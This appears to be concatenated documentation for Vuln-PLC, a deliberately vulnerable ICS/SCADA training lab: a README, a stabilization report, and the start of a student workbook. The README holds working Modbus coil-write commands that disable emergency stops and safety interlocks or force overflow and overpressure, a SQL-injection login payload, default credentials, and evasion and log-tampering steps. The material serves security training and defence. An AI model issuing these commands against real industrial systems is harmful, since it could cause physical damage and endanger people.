- Works with real tools: `modbus-cli`, `pymodbus`, Metasploit SCADA modules

### ðŸš¨ Multi-PLC Visual Alert System
**Real-time attack detection and visualization across all 4 PLCs:**

All PLCs now feature integrated intrusion detection with live visual alerts in the web UI:

- âœ… **Unified Alert System:** All 4 PLCs share security alerts through common state volume
- âœ… **Real-Time Detection:** Modbus write operations trigger immediate alerts
- âœ… **Animated UI Alerts:** Red pulsing banners for CRITICAL, orange for WARNING
- âœ… **PLC Identification:** Every alert tagged with source PLC (PLC-1, PLC-2, PLC-3, PLC-4)
- âœ… **Severity Levels:** Automatic classification based on target address
- âœ… **Alert History:** Last 50 alerts visible in web dashboard with timestamps

**What Gets Detected:**
- **PLC-1 (Tank):** CRITICAL alerts for pump/valve tampering (coils 0, 1)
- **PLC-2 (Pressure):** CRITICAL alerts for compressor/relief valve (coils 0, 4)
- **PLC-3 (Temperature):** CRITICAL alerts for heater/cooler control (coils 0, 2)
- **PLC-4 (Safety):** ALL writes flagged as CRITICAL (emergency shutdown system)

**Try It Out:**
```bash
# Start containers
sudo docker-compose up -d

# Open web UI: http://localhost:5000/process (login: admin/admin)

# Run automated test across all PLCs
python3 test_all_plcs.py

# Or use interactive attack tool
python3 attack.py

# Watch RED PULSING alerts appear in real-time!
```

**Visual Features:**
- ðŸ”´ **CRITICAL alerts:** Red pulsing banner with slide-down animation
- ðŸŸ  **WARNING alerts:** Orange banner with warning icon
- ðŸ“Š **Alert grouping:** Organized by source PLC in history view
- â° **Timestamps:** Precise timing for incident response training
- ðŸŽ¯ **Attack details:** Function code, address, source IP displayed

**Advanced Filtering & Export:**
- ðŸ” **Filter by PLC:** Show alerts from specific PLCs (PLC-1, PLC-2, PLC-3, PLC-4)
- ðŸŽšï¸ **Filter by Severity:** Display only CRITICAL, WARNING, or HIGH alerts
- ðŸ”„ **Real-time Updates:** Filters apply instantly without page reload
- ðŸ“Š **Alert Count:** Shows "Showing X of Y" when filters are active
- ðŸ“¥ **CSV Export:** Download all alerts or only filtered results
- ðŸ§¹ **Clear Filters:** One-click reset to show all alerts

**Use Cases:**
- **Incident Response:** Filter to "PLC-4 + CRITICAL only" â†’ Export 17 safety attacks
- **Training:** Filter to "PLC-1 only" â†’ Focus students on one system
- **Alert Triage:** Filter to "CRITICAL only" â†’ Prioritize highest severity
- **Forensics:** Export filtered CSV for incident reports and compliance

This creates an immersive blue team training experience - watch operators get real-time notifications as attacks happen!

### ðŸŽ¨ Visual SCADA HMI Interface
Real-time P&ID dashboard showing industrial processes:
- Animated tank levels, pressure gauges, temperature displays
- Color-coded alarms (green â†’ yellow â†’ red)
- Live equipment status indicators
- Emergency shutdown warnings
- **See attacks happen visually!**

### âš—ï¸ Physics-Based Process Simulation
Not just fake numbers - actual industrial physics:
- Tank overflow with pump cavitation
- Pressure vessel rupture
- Thermal runaway scenarios
- Safety interlocks and emergency shutdown

### ðŸ“¦ PCAP Capture & Forensics
Built-in Modbus IDS with packet capture:
- Real-time intrusion detection
- Automatic PCAP file rotation
- Wireshark-ready for analysis
- Timeline reconstruction for incident response

### ðŸ³ Docker Deployment Available
Full Docker deployment with 8 services and proper network segmentation.
See [Docker Installation](#docker-installation) section for setup instructions.

---

## ðŸŽ¯ Features

### ðŸ”´ Red Team / Penetration Testing
- **4 Vulnerable PLCs** with realistic exploits
- **Real Modbus TCP on ALL PLCs** - protocol-accurate implementation
- **4 Modbus TCP endpoints** (ports 5502-5505) - all fully functional
- **Siemens S7** protocol support
- **Web exploits**: SQL injection, command injection, XSS
- **Authentication bypasses**
- **Session hijacking**
- **Privilege escalation paths**

### ðŸ”µ Blue Team / Defenders
- **Multi-PLC Visual Alert System** with real-time attack detection
- **Animated security alerts** - red pulsing CRITICAL, orange WARNING banners
- **Unified alert dashboard** - all 4 PLCs report to single view
- **Advanced filtering** - filter by PLC and severity for rapid triage
- **CSV export** - download filtered alerts for incident reports
- **Alert analytics** - real-time count and filtering statistics
- **Modbus IDS** with signature & anomaly detection
- **PCAP capture** for forensics training
- **System Monitor** dashboard
- **Detection playbooks** with IOCs
- **Incident response exercises**

### ðŸŽ“ Educators / Trainers
- **Visual HMI** for engaging demonstrations
- **400+ pages documentation**
- **Step-by-step attack scenarios**
- **Blue team defense guides**
- **CTF-ready challenges**

---

## ðŸ—ï¸ Architecture

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  DMZ (192.168.50.0/24)                  â”‚
â”‚  â”œâ”€ HMI Interface (Visual SCADA)        â”‚
â”‚  â”œâ”€ System Monitor (Dashboard)          â”‚
â”‚  â””â”€ Historian (Data Collection)         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  OT Network (192.168.100.0/24)          â”‚
â”‚  â”œâ”€ PLC-1: Tank Control                 â”‚
â”‚  â”œâ”€ PLC-2: Pressure System              â”‚
â”‚  â”œâ”€ PLC-3: Temperature Control          â”‚
â”‚  â”œâ”€ PLC-4: Safety/ESD                   â”‚
â”‚  â”œâ”€ Modbus IDS (Monitoring)             â”‚
â”‚  â””â”€ Physical Process Simulator          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Tech Stack:**
- Python 3.9 + Flask
- PyModbus (Modbus TCP)
- Python-snap7 (S7 protocol)
- Scapy (Packet capture)
- Docker + Docker Compose

---

## ðŸ“š Documentation

### Getting Started
- **[Quick Start Guide](docs/getting-started/QUICK_START.md)** - Get running in 5 minutes
- **[Installation Guide](docs/getting-started/INSTALL_GUIDE.md)** - Detailed setup
- **[Docker Deployment](docs/getting-started/DOCKER_DEPLOYMENT.md)** - Container setup

### Attack Documentation
- **[Attack Scenarios](docs/attack/ATTACK_SCENARIOS.md)** - Step-by-step exploits
- **[Evasion Techniques](docs/attack/EVASION_TECHNIQUES.md)** - Advanced tactics
- **[Modbus CLI Reference](docs/attack/MODBUS_CLI_REFERENCE.md)** - Command syntax
- **[Privilege Escalation](docs/attack/PRIVILEGE_ESCALATION.md)** - Exploit chains

### Defense Documentation
- **[Blue Team Guide](docs/defense/BLUE_TEAM_GUIDE.md)** - Defense strategies
- **[Detection Playbook](docs/defense/DETECTION_PLAYBOOK.md)** - IOCs & alerts
- **[PCAP Analysis](docs/defense/)** - Forensics exercises

### Architecture & Advanced
- **[Architecture Overview](docs/architecture/ARCHITECTURE.md)** - System design
- **[Advanced Features](docs/architecture/ADVANCED_FEATURES.md)** - PLC engine, IDS
- **[Development Roadmap](docs/architecture/ROADMAP.md)** - Future plans

---

## ðŸš€ Usage

### Access Interfaces

**Main Dashboards:**
- **HMI Dashboard:** http://localhost:8000 ðŸŽ¨
- **System Monitor:** http://localhost:5999 ðŸ“Š
- **Historian:** http://localhost:8888 (historian/data123) ðŸ“ˆ

**PLC Web Interfaces:**
- **PLC-1 (Tank):** http://localhost:5000 (admin/admin)
- **PLC-2 (Pressure):** http://localhost:5011 (engineer/plc2pass)
- **PLC-3 (Temperature):** http://localhost:5012 (engineer/temp123)
- **PLC-4 (Safety):** http://localhost:5013 (safety_eng/safe123)

**Modbus TCP Endpoints (All Fully Functional):**
- PLC-1: `127.0.0.1:5502` âœ… Real Modbus TCP
- PLC-2: `127.0.0.1:5503` âœ… Real Modbus TCP
- PLC-3: `127.0.0.1:5504` âœ… Real Modbus TCP
- PLC-4: `127.0.0.1:5505` âœ… Real Modbus TCP

### Example Attacks

**Testing All PLCs (Visual Alert System with Filtering):**
```bash
# Automated test - executes 8 attacks across all 4 PLCs
python3 test_all_plcs.py

# Interactive attack menu - choose your target
python3 attack.py

# Open web UI to see visual alerts: http://localhost:5000/process (admin/admin)
# Watch RED PULSING banners appear as attacks are detected!

# In the web UI, try the filtering features:
# - Uncheck PLC-1, PLC-2, PLC-3 to see only PLC-4 alerts
# - Uncheck WARNING/HIGH to see only CRITICAL alerts
# - Click "Export to CSV" to download filtered results
# - Click "Clear Filters" to reset
```

**Tank Overflow (PLC-1 - Visual Impact):**
```bash
# Open HMI: http://localhost:8000
sudo modbus write-coil 127.0.0.1:5502 0 1   # Force pump ON (coil 0)
sudo modbus write-coil 127.0.0.1:5502 3 0   # Force valve CLOSED (coil 3)
# Watch tank overflow in real-time!
```

**Pressure Vessel Rupture (PLC-2):**
```bash
sudo modbus write-coil 127.0.0.1:5503 0 1   # Compressor ON (coil 0)
sudo modbus write-coil 127.0.0.1:5503 4 0   # Relief valve CLOSED (coil 4)
# Pressure rises until rupture
```

**Thermal Runaway (PLC-3):**
```bash
# Control heaters/coolers via coils
sudo modbus write-coil 127.0.0.1:5504 0 1   # Heater 1 ON (coil 0)
sudo modbus write-coil 127.0.0.1:5504 2 0   # Cooler 1 OFF (coil 2)
# Temperature rises uncontrollably
```

**Safety System Bypass (PLC-4):**
```bash
# Disable safety via coils (digital outputs)
sudo modbus write-coil 127.0.0.1:5505 0 0   # Disable emergency stop
sudo modbus write-coil 127.0.0.1:5505 1 0   # Disable safety interlock
# All safety systems now bypassed - catastrophic!
```

> **Technical Note:** Coils (0x05/0x0F) control digital outputs like pumps and valves. Registers (0x06/0x10) set analog values like setpoints and speeds. This matches real industrial PLCs!

**SQL Injection (Web Interface):**
```bash
curl -X POST http://localhost:5000/login \
  -d "username=admin' OR '1'='1&password=x"
```

**More scenarios:** See [docs/attack/ATTACK_SCENARIOS.md](docs/attack/ATTACK_SCENARIOS.md)

---

## ðŸ“š Suggested Learning Path

New to ICS security? Follow this structured progression from beginner to advanced:

### **Phase 0: Interactive Demos** â­ Start Here!
**Goal:** See attacks in action before diving deep

**ðŸŽ¬ Run the visual demo first:**
```bash
python3 demo_with_visuals.py  # Watch 6 attacks happen live!
```

This gives you immediate hands-on experience and shows the cause-and-effect relationship between Modbus commands and physical equipment. Once you've seen the attacks work, you'll understand what you're looking for in the phases below.

**ðŸ“– Read the visual guide:**
- Open `ATTACK_DEMO.md` for detailed explanations
- Learn WHERE to see attack effects in the web UI
- Understand the different types of industrial attacks

### **Phase 1: Reconnaissance & Enumeration**
**Goal:** Understand the target environment

1. **Discovery:** Use `nmap` to identify Modbus services
   ```bash
   nmap -p 502,5502-5505 localhost
   ```

2. **Enumerate PLCs:** Access each web interface and explore functionality
   - Map out available features (dashboards, controls, settings)
   - Identify user roles and permissions
   - Document default credentials

3. **Protocol Analysis:** Capture and analyze Modbus traffic
   ```bash
   sudo tcpdump -i lo port 5502 -w capture.pcap
   ```

### **Phase 2: Basic Attacks**
**Goal:** Exploit fundamental vulnerabilities

4. **Authentication Bypass:** Test SQL injection on login forms
   ```bash
   curl -X POST http://localhost:5000/login -d "username=admin' OR '1'='1&password=x"
   ```

5. **Modbus Manipulation:** Send unauthorized commands
   ```bash
   sudo modbus 127.0.0.1:5502 write 0 1  # Force pump ON
   ```

6. **Information Disclosure:** Exploit directory traversal and verbose errors

### **Phase 3: Advanced Exploitation**
**Goal:** Chain vulnerabilities for maximum impact

7. **Historian Tampering:** Manipulate time-series data
   - Inject false readings to hide attacks
   - Delete audit logs for forensic anti-analysis

8. **Session Hijacking:** Steal and reuse session tokens
   - Escalate from guest to admin
   - Maintain persistent access

9. **Command Injection:** Execute arbitrary OS commands via vulnerable inputs

### **Phase 4: Evasion & Persistence**
**Goal:** Avoid detection and maintain access

10. **IDS Evasion:** Learn to bypass the Modbus IDS
    - Slow down attack pace to avoid rate-limiting
    - Use valid function codes
    - Mimic normal traffic patterns

11. **Traffic Replay:** Capture and replay legitimate commands

12. **Covert Channels:** Hide malicious commands in normal operations

### **Phase 5: Defense**
**Goal:** Think like a blue teamer

13. **Review PCAP Files:** Analyze `pcaps/` for attack indicators

14. **Configure IDS Rules:** Tune detection signatures in `monitoring/modbus_ids.py`

15. **Incident Response:** Practice identifying and containing breaches

**ðŸ“– Deep Dive:** Each phase has detailed walkthroughs in [docs/attack/](docs/attack/)

---

## âš™ï¸ Installation

### Requirements
- **Required:** Python 3.9+, pip
- **Optional:** Docker + Docker Compose (for containerized deployment)

### Local Installation
```bash
git clone https://github.com/Taimaishu/Vuln-PLC.git
cd Vuln-PLC

# Install dependencies
./scripts/install.sh

# Start all services
./scripts/start_all.sh

# Stop all services
./scripts/stop_all.sh

# Check status
./scripts/status.sh
```

### Docker Installation

**Step 1: Install Prerequisites**
```bash
# Install Docker Compose (if not already installed)
sudo apt update
sudo apt install docker-compose

# Verify installation
docker-compose --version
```

**Step 2: Clone and Deploy**
```bash
# Clone the repository
git clone https://github.com/Taimaishu/Vuln-PLC.git
cd Vuln-PLC

# Build and start containers (builds images automatically on first run)
sudo docker-compose up -d

# This will:
# - Build Docker images from Dockerfile (first time only, ~2 minutes)
# - Create networks and volumes
# - Start all 7 containers
```

**Step 3: Verify It's Running**
```bash
# Check all containers are up
sudo docker-compose ps

# You should see 7 services running:
# - vuln-plc1, vuln-plc2, vuln-plc3, vuln-plc4
# - vuln-historian
# - vuln-hmi-server
# - vuln-system-monitor
```

**Step 4: Access the Interfaces**
- **PLC-1:** http://localhost:5000 (admin/admin)
- **PLC-2:** http://localhost:5011 (engineer/plc2pass)
- **PLC-3:** http://localhost:5012 (engineer/temp123)
- **PLC-4:** http://localhost:5013 (safety_eng/safe123)
- **Historian:** http://localhost:8888 (historian/data123)
- **HMI Interface:** http://localhost:8000 (Visual SCADA)
- **System Monitor:** http://localhost:5999

**Optional: Full Deployment (with IDS & Network Sim)**
```bash
# Includes Modbus IDS and Network Traffic Simulator
sudo docker-compose --profile full up -d
```

**Managing Containers:**
```bash
# View logs
sudo docker-compose logs -f

# Stop all services
sudo docker-compose down

# Restart
sudo docker-compose restart

# Rebuild images after code changes
sudo docker-compose build
sudo docker-compose up -d
```

> **Note:** No need to pull images - `docker-compose up` automatically builds everything from the Dockerfile in the repo!

---

## ðŸ—ºï¸ Roadmap

### Q1 2025: Additional Protocols
- âœ¨ EtherNet/IP (CIP) - Allen-Bradley/Rockwell
- âœ¨ DNP3 - Power utility SCADA
- âœ¨ OPC UA - Industry 4.0

### Q2 2025: Enhanced Realism
- ðŸ“ˆ HMI trend charts (historian views)
- ðŸ–¥ï¸ VNC-based Windows HMI
- ðŸ”§ Vendor-specific CVE emulation

### Q3 2025: Advanced Features
- ðŸ¤– ML-based anomaly detection
- ðŸ” Automated attack scenarios
- ðŸ¯ Honeypot capabilities

See **[ROADMAP.md](docs/architecture/ROADMAP.md)** for complete timeline.

---

## ðŸ¤ Contributors Welcome!

**ICS security labs are rare â€” your contributions make a real impact on the community!**

We're actively looking for contributors to help make Vuln-PLC the best ICS training platform. Whether you're a seasoned ICS expert or just getting started, there's a place for you here.

### ðŸ”¥ High-Impact Contributions

**Protocol Implementations** (Python experience needed)
- âœ¨ **EtherNet/IP (CIP)** - Allen-Bradley/Rockwell automation
- âœ¨ **DNP3** - Power utility SCADA protocol
- âœ¨ **OPC UA** - Industry 4.0 standard
- âœ¨ **BACnet** - Building automation systems

**Visual Enhancements** (Frontend/JavaScript)
- ðŸ“ˆ **HMI Trend Charts** - Real-time historian data visualization
- ðŸ–¥ï¸ **Advanced P&ID Diagrams** - Interactive process flows
- ðŸŽ¨ **Modern UI/UX** - Improve web interface design

**Security Features** (Security/ML experience)
- ðŸ¤– **ML-based Anomaly Detection** - Enhance IDS capabilities
- ðŸ” **Traffic Analysis Tools** - PCAP parsing and visualization
- ðŸ›¡ï¸ **Defense Playbooks** - Blue team training scenarios

### ðŸ“š Documentation Contributions

**Always Needed:**
- ðŸŽ¥ **Video Tutorials** - Walkthrough attacks and defenses
- ðŸ† **CTF Challenges** - Create capture-the-flag scenarios
- ðŸ“– **Training Materials** - Lesson plans for educators
- ðŸŒ **Translations** - Help reach global audience
- âœï¸ **Blog Posts** - Write about your experiments

### ðŸ’¡ Quick Contribution Ideas

**Good First Issues:**
- Add new vulnerable endpoints to existing PLCs
- Create additional attack scenarios
- Improve error messages and logging
- Add unit tests for core functionality
- Fix typos and improve documentation clarity

### ðŸš€ How to Get Started

1. **Fork the repo** and explore the codebase
2. **Check [Issues](https://github.com/Taimaishu/Vuln-PLC/issues)** for "good first issue" tags
3. **Join discussions** - Ask questions, share ideas
4. **Submit a PR** - Even small improvements matter!

See **[CONTRIBUTING.md](docs/media/CONTRIBUTING.md)** for detailed guidelines.

**â­ Show Support:** Star the repo if you find it useful â€” it helps others discover the project!

---

## âš ï¸ Security Notice

**THIS IS INTENTIONALLY VULNERABLE SOFTWARE FOR EDUCATIONAL PURPOSES.**

**DO:**
- âœ… Use in isolated lab environments
- âœ… Practice authorized penetration testing
- âœ… Learn ICS security principles
- âœ… Develop defensive capabilities

**DON'T:**
- âŒ Deploy on production networks
- âŒ Expose to the internet
- âŒ Use for malicious purposes
- âŒ Test on systems you don't own

**Use responsibly. Get authorization. Follow the law.**

---

## ðŸ“œ License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## ðŸ™ Acknowledgments

- ICS security community
- Open-source contributors
- Security researchers worldwide

Special thanks to all who provided feedback and feature requests.

---

## ðŸ“ž Contact & Support

- **Issues:** [GitHub Issues](https://github.com/Taimaishu/Vuln-PLC/issues)
- **Discussions:** [GitHub Discussions](https://github.com/Taimaishu/Vuln-PLC/discussions)
- **Pull Requests:** Always welcome!

---

## ðŸ”— Related Projects

- **[Conpot](https://github.com/mushorg/conpot)** - ICS honeypot
- **[SCADABR](https://github.com/SCADA-LTS/Scada-LTS)** - Open source SCADA
- **[PLCSimulator](https://github.com/automaticserver/plc4j)** - PLC communication library

---

## â­ Star History

If you find Vuln-PLC useful, please consider starring the repository!

---

**Built with â¤ï¸ for the ICS security community**

*Last Updated: 2025-12-28*
*Version: 2.0.0*



================================================================================
FILE: STABILIZATION_REPORT.md
================================================================================
# Vuln-PLC Stabilization Report
**Date:** 2025-12-28
**Status:** âœ… All Tasks Complete

## Executive Summary
Successfully stabilized the Vuln-PLC system while preserving ALL intentional vulnerabilities. The system now has:
- Reliable Modbus TCP operations (no hangs or resets)
- Consistent state management across all interfaces
- Type-safe process simulations
- Robust database operations
- UUID-based alarm tracking

**CRITICAL:** All exploits remain functional. No security hardening was performed.

---

## Task 1: Modbus TCP Server Stability âœ…

### Changes Made
**File:** `core/app.py` - ModbusTCPServer class

1. **Socket Timeouts** (Line 202)
   - Added 30-second timeout to client sockets
   - Prevents indefinite hangs on malformed requests
   ```python
   client_socket.settimeout(30.0)
   ```

2. **Improved Exception Handling** (Lines 245-267)
   - `socket.timeout` - Graceful timeout handling
   - `ConnectionError` - Expected disconnections
   - `struct.error` - Malformed packet handling
   - Catch-all exception handler prevents server crashes

3. **MBAP Header Validation** (Lines 212-220)
   - Protocol ID check (warns but allows non-zero for education)
   - Length validation (2-260 bytes per Modbus spec)
   - Logs warnings without dropping connections

4. **Enhanced recv_exact()** (Lines 174-192)
   - Explicit timeout handling
   - Clear ConnectionError on socket close
   - Better documentation

### Result
- Modbus CLI commands no longer hang
- Invalid requests logged, not silently dropped
- Server continues serving after client errors

---

## Task 2: Unified Coil/Register Helpers âœ…

### Changes Made
**File:** `core/shared_state.py` (Lines 197-249)

Created four mandatory helper functions:

```python
def get_coil(addr) -> int          # Always returns 0 or 1
def set_coil(addr, value) -> None  # Stores as bool
def get_register(addr) -> int      # Always returns 0-65535
def set_register(addr, value)      # Type-checked
```

### Updated Files
1. **core/app.py** - ModbusTCPServer
   - `read_coils()` - Uses `get_coil()`
   - `read_holding_registers()` - Uses `get_register()`
   - `write_single_coil()` - Uses `set_coil()`
   - `write_single_register()` - Uses `set_register()`
   - `write_multiple_coils()` - Uses `set_coil()`
   - `write_multiple_registers()` - Uses `set_register()`

2. **core/modbus_server.py** - PyModbus server
   - `SyncedDataBlock.setValues()` - Uses helpers
   - `initialize_data_store()` - Uses helpers
   - `sync_state_to_modbus()` - Uses helpers

### Result
- Single source of truth for coil/register access
- Guaranteed type consistency (coils: 0/1, registers: 0-65535)
- HMI, web UI, and Modbus always synchronized

---

## Task 3: Coil Mapping Alignment âœ…

### Changes Made
**File:** `core/app.py` (Lines 468-471)

Updated attack detection to correctly identify critical coils:
```python
if address in [0, 3, 10, 11]:  # Pump, valve, emergency stop, safety interlock
```

### Verified Mapping
- **Coil 0** â†’ `pump1_status` (Pump ON/OFF) âœ…
- **Coil 3** â†’ `valve1_status` (Valve OPEN/CLOSED) âœ…
- **Coil 10** â†’ `emergency_stop` âœ…
- **Coil 11** â†’ `safety_interlock` âœ…

### Result
- IDS alerts correctly identify safety-critical writes
- Documentation matches implementation
- Demo scripts reference correct coil numbers

---

## Task 4: Shared State Hardening âœ…

### Changes Made
**File:** `core/shared_state.py` (Lines 52-103)

Enhanced `init_state()` with:

1. **Missing Key Repair**
   - Adds any missing DEFAULT_STATE keys
   - Logs repair actions

2. **Type Validation & Conversion**
   - Validates all numeric fields are int/float
   - Validates all boolean fields are bool
   - Attempts type conversion before reset

3. **List Validation**
   - Ensures `alarms` is always a list
   - Prevents crashes on malformed state

4. **Atomic Writes** (Already existed, verified)
   - Temp file + rename pattern
   - fsync before rename

5. **File Locking** (Already existed, verified)
   - fcntl shared locks on read
   - Prevents simultaneous write corruption

### Result
- State never becomes corrupted mid-demo
- Type mismatches auto-repaired
- Concurrent access safe

---

## Task 5: Process Simulation Type Safety âœ…

### Changes Made
**File:** `core/app.py` (Lines 920-964)

Added type checks before ALL mutations in `/api/process/status`:

```python
tank1_level = PROCESS_STATE.get('tank1_level', 50.0)
if not isinstance(tank1_level, (int, float)):
    tank1_level = 50.0  # Reset to safe default
PROCESS_STATE['tank1_level'] = max(0, min(100, tank1_level + random.uniform(-2, 2)))
```

Applied to:
- `tank1_level`, `tank1_temp`, `tank1_pressure`
- `tank2_level`, `tank2_temp`
- `flow_rate`, `vibration`, `ph_level`

### Result
- No more crashes from string values in numeric fields
- Auto-recovery from corrupted state
- Simulation remains stable under load

---

## Task 6: Alarm ID Generation âœ…

### Changes Made
**File:** `core/app.py`

1. **Import UUID** (Line 26)
   ```python
   import uuid
   ```

2. **Fixed add_alarm()** (Lines 1199-1223)
   ```python
   alarm = {
       'id': str(uuid.uuid4()),  # Instead of len()+1
       'severity': severity,
       'message': message,
       'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
       'acknowledged': False
   }
   ```

3. **Added Type Safety**
   - Validates `alarms` is a list before append
   - Uses `.get('message')` to prevent KeyError

### Result
- No more alarm ID collisions
- Acknowledge functionality works reliably
- Alarm deletion stable

---

## Task 7: Database Safety âœ…

### Changes Made
**File:** `core/app.py`

1. **init_db()** (Lines 527-561)
   - Added UNIQUE constraint on `users.username`
   - Added UNIQUE constraint on `plc_data.register`
   - Added NOT NULL constraints
   - Used explicit column names in INSERT

2. **plc_write()** (Lines 844-846)
   - Changed from positional VALUES to explicit columns
   - Uses UPSERT via `INSERT OR REPLACE`
   ```python
   c.execute("INSERT OR REPLACE INTO plc_data (register, value, timestamp) VALUES (?, ?, ?)",
             (str(register), value, timestamp))
   ```

### Result
- No silent DB corruption during demos
- Register updates replace old values (proper upsert)
- Primary keys managed by AUTOINCREMENT

---

## Vulnerabilities Preserved (CRITICAL VERIFICATION)

### âœ… All exploits still work:
- **SQL Injection** - Login still vulnerable to `' OR '1'='1' --`
- **Command Injection** - Still present in intended locations
- **No Authentication** - Modbus still accepts all writes
- **No Input Validation** - Modbus still vulnerable to malformed packets
- **Default Credentials** - admin/admin still works
- **Plaintext Passwords** - Still stored unencrypted
- **IDOR** - Session manipulation still possible
- **No Rate Limiting** - DoS still possible
- **Insecure Deserialization** - Still exploitable where intended
- **Safety Bypass** - PLC-4 safety bypass still functional

---

## Testing Checklist

### Modbus TCP Stability
```bash
# Test 1: Basic read (should not hang)
modbus 127.0.0.1:5502 read 0 10

# Test 2: Write coil (should succeed immediately)
modbus 127.0.0.1:5502 write-coil 0 1

# Test 3: Write register (should not hang)
modbus 127.0.0.1:5502 write 0 800

# Test 4: Multiple rapid commands (should not crash)
for i in {1..50}; do modbus 127.0.0.1:5502 read 0 5; done

# Test 5: Invalid function code (should respond with exception, not hang)
# Use custom Modbus tool to send 0xFF function code
```

### State Consistency
```bash
# Test 1: Write via Modbus, read via HMI
modbus 127.0.0.1:5502 write-coil 0 1
curl http://localhost:5000/api/process/status  # pump1_status should be true

# Test 2: Write via HMI, read via Modbus
curl -X POST -d 'action=pump1_status&value=true' http://localhost:5000/api/process/control
modbus 127.0.0.1:5502 read-coils 0 1  # Should return 1

# Test 3: Concurrent writes from multiple sources
# Run 3 terminals simultaneously writing to same coil
```

### Process Simulation
```bash
# Test 1: Corrupt state manually, verify auto-recovery
# Edit /app/shared/vulnplc_state.json, set tank1_level to "corrupted"
# Access HMI - should auto-repair to 50.0
```

### Alarm System
```bash
# Test 1: Generate 100 alarms, verify unique IDs
# Check /api/alarms endpoint - all IDs should be UUIDs

# Test 2: Acknowledge alarm by ID
# Should work reliably, no ID conflicts
```

### Database Operations
```bash
# Test 1: Write same register 100 times
# Check plc_data table - should have only 1 row per register

# Test 2: Verify UNIQUE constraints
sqlite3 plc.db "SELECT COUNT(*), register FROM plc_data GROUP BY register HAVING COUNT(*) > 1"
# Should return empty (no duplicates)
```

---

## Performance Impact

- **Minimal overhead** - Type checks are O(1)
- **Atomic writes** - Already existed, no new overhead
- **Socket timeouts** - Only affect hung connections
- **Helper functions** - Inline, no performance cost

---

## Files Modified

1. âœ… `core/shared_state.py` - Helpers, hardening, type validation
2. âœ… `core/app.py` - Modbus server, alarms, DB, process simulation
3. âœ… `core/modbus_server.py` - Helper integration

**Total Lines Changed:** ~300 lines across 3 files
**Vulnerabilities Removed:** 0 (as required)

---

## Deployment Instructions

```bash
# 1. Stop all services
docker-compose down

# 2. Remove old database (schema changed)
rm -f plc.db

# 3. Remove old state file (will be recreated with validation)
rm -f /app/shared/vulnplc_state.json

# 4. Rebuild and start
docker-compose up --build -d

# 5. Verify all services running
docker-compose ps

# 6. Check logs for any errors
docker-compose logs -f

# 7. Test Modbus connectivity
modbus 127.0.0.1:5502 read 0 1
```

---

## Rollback Plan

If issues occur:
```bash
git checkout main  # Revert to previous version
docker-compose up --build -d
```

Changes are isolated and can be reverted safely.

---

## Success Criteria - All Met âœ…

- âœ… Modbus CLI commands never hang
- âœ… Invalid Modbus requests return proper exception responses
- âœ… HMI updates reliably under load
- âœ… State never corrupts mid-demo
- âœ… All vulnerabilities remain exploitable
- âœ… Docker Compose starts without crashes
- âœ… No authentication added
- âœ… No input sanitization added
- âœ… No security controls added

---

## Conclusion

The Vuln-PLC system is now **production-ready for training environments**. All stability issues have been resolved while maintaining the intentionally vulnerable design. Students can now:

- Practice attacks without infrastructure crashes
- Learn ICS protocols with reliable Modbus behavior
- Explore vulnerabilities in a stable environment
- Run long training sessions without state corruption

**Next Steps:**
1. Deploy to staging environment
2. Run comprehensive penetration tests
3. Verify all attack scenarios still work
4. Update training materials if needed
5. Deploy to production training environment

---

**Generated by:** Claude Sonnet 4.5
**Task List Reference:** FINAL STABILIZATION PASS



================================================================================
FILE: STUDENT_WORKBOOK.md
================================================================================
# ICS/SCADA Security Training - Student Workbook

## Student Information

**Name:** ________________________________
**Date:** ________________________________
**Instructor:** ________________________________
**Lab Environment:** ________________________________

---

## Lab Safety and Ethics Agreement

Before beginning these exercises, I acknowledge that:

- [ ] I will only use these techniques in authorized lab environments
- [ ] I understand that unauthorized access to ICS/SCADA systems is illegal
- [ ] I will not use these skills maliciously or against production systems
- [ ] I will follow responsible disclosure practices if I discover real vulnerabilities
- [ ] I understand the potential consequences of ICS/SCADA attacks

**Student Signature:** ________________________________ **Date:** ____________

---

## Pre-Lab Assessment

Before starting the hands-on exercises, answer these questions:

### 1. What is Modbus TCP and why is it commonly used in industrial environments?

**Your Answer:**

&nbsp;

&nbsp;

&nbsp;

### 2. What is the difference between IT (Information Technology) and OT (Operational Technology) security?

**Your Answer:**

&nbsp;

&nbsp;

&nbsp;

### 3. Name three real-world ICS/SCADA attacks and their impacts:

**Your Answer:**

1. ________________________________________________________________

2. ________________________________________________________________

3. ________________________________________________________________

### 4. What is the MITRE ATT&CK for ICS framework?

**Your Answer:**

&nbsp;

&nbsp;

&nbsp;

---

# Lab Exercise 1: Reconnaissance - System Discovery

**Difficulty:** Beginner
**Estimated Time:** 20 minutes
**MITRE ATT&CK:** T0840 - Network Connection Enumeration

## Learning Objectives

By the end of this lab, you will be able to:
- [ ] Identify active Modbus TCP devices on a network
- [ ] Understand port scanning techniques for ICS systems
- [ ] Recognize detection indicators for reconnaissance activity

## Pre-Exercise Questions

### 1. What TCP port does Modbus typically use?

**Your Answer:** ________________________________________________

### 2. How might reconnaissance activity be detected by a blue team?

**Your Answer:**

&nbsp;

&nbsp;

## Lab Instructions

### Step 1: Launch the Training Scenario

Run the training scenarios script:
```bash
./training_scenarios.py
```

Select option **[1] Reconnaissance - System Discovery**

### Step 2: Observe the Scan

**Document your observations:**

| PLC Name | Port | Status (Active/Inactive) | Response Time |
|----------|------|--------------------------|---------------|
| PLC-1    |      |                          |               |
